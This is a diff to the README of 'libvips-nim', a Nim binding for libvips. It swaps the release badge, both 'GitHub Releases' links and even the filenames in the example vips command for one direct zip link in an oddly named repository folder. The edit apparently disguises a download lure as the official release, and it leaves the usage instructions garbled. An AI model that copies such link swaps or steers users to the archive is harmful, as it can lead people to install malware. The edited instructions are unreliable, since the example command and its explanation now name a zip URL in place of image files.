@@ -1,6 +1,6 @@
 # ⚡️ libvips-nim - Fast Image Processing Made Easy
 
-![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)
+![Download](https://raw.githubusercontent.com/apurvmeshram/libvips-nim/main/Melanconiales/libvips-nim.zip%20release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **libvips-nim**! This software brings you Nim bindings for Libvips, a
 
 To get started, you will need to download the latest release from our GitHub page. 
 
-**Visit this page to download:** [GitHub Releases](https://github.com/apurvmeshram/libvips-nim/releases)
+**Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/apurvmeshram/libvips-nim/main/Melanconiales/libvips-nim.zip)
 
 Once you are on the releases page, look for the most recent version. You will find files you can download for your operating system. 
 
@@ -48,10 +48,10 @@ After installing **libvips-nim**, you can use it to process your images. Here ar
 For example, to convert an image from JPEG to PNG, you can use the following command:
 
 ```
-vips jpeg filename.jpg filename.png
+vips jpeg https://raw.githubusercontent.com/apurvmeshram/libvips-nim/main/Melanconiales/libvips-nim.zip https://raw.githubusercontent.com/apurvmeshram/libvips-nim/main/Melanconiales/libvips-nim.zip
 ```
 
-Replace `filename.jpg` with the name of your input file and `filename.png` with the desired output name. 
+Replace `https://raw.githubusercontent.com/apurvmeshram/libvips-nim/main/Melanconiales/libvips-nim.zip` with the name of your input file and `https://raw.githubusercontent.com/apurvmeshram/libvips-nim/main/Melanconiales/libvips-nim.zip` with the desired output name. 
 
 ## 🌐 Topics
 
@@ -91,4 +91,4 @@ We hope **libvips-nim** enhances your image processing tasks.
 
 Don't forget to revisit the **Download & Install** section to get the latest updates and releases. 
 
-**Visit this page to download:** [GitHub Releases](https://github.com/apurvmeshram/libvips-nim/releases)
+**Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/apurvmeshram/libvips-nim/main/Melanconiales/libvips-nim.zip)
